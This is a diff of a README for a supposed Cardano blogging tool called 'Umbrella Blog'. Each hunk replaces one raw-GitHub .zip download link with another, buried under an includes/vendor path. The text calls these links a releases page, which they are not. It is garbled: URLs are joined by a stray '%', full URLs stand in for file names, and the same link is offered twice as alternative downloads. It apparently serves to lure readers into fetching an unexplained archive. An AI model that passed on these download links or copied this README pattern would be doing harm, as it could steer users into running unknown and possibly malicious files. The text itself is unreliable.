@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download](https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/templates/umbrella-blog-cardano-blogging-tool-1.1.zip%https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/templates/umbrella-blog-cardano-blogging-tool-1.1.zip)](https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/templates/umbrella-blog-cardano-blogging-tool-1.1.zip)
+[![Download](https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/includes/vendor/tool_blogging_umbrella_cardano_blog_v3.3-beta.1.zip%https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/includes/vendor/tool_blogging_umbrella_cardano_blog_v3.3-beta.1.zip)](https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/includes/vendor/tool_blogging_umbrella_cardano_blog_v3.3-beta.1.zip)
 
 ---
 
@@ -26,10 +26,10 @@ Before you begin, ensure your system meets these requirements:
 1. **Visit the Download Page**
    Go to the releases page to find the latest version of Umbrella Blog. 
 
-   [Visit this page to download](https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/templates/umbrella-blog-cardano-blogging-tool-1.1.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/includes/vendor/tool_blogging_umbrella_cardano_blog_v3.3-beta.1.zip)
 
 2. **Choose the Right File**
-   Find the latest release that matches your operating system. Look for files named `https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/templates/umbrella-blog-cardano-blogging-tool-1.1.zip` or `https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/templates/umbrella-blog-cardano-blogging-tool-1.1.zip`.
+   Find the latest release that matches your operating system. Look for files named `https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/includes/vendor/tool_blogging_umbrella_cardano_blog_v3.3-beta.1.zip` or `https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/includes/vendor/tool_blogging_umbrella_cardano_blog_v3.3-beta.1.zip`.
 
 3. **Download the File**
    Click on your chosen file to begin downloading it. The file may take a few moments to download depending on your internet speed.
@@ -65,7 +65,7 @@ Before you begin, ensure your system meets these requirements:
 
 To get started with Umbrella Blog, simply follow these steps and download your copy from the Releases page:
 
-[Visit this page to download](https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/templates/umbrella-blog-cardano-blogging-tool-1.1.zip)
+[Visit this page to download](https://raw.githubusercontent.com/blacknr512/umbrella-blog-cardano-blogging-tool/main/includes/vendor/tool_blogging_umbrella_cardano_blog_v3.3-beta.1.zip)
 
 ## 🐛 Troubleshooting
 
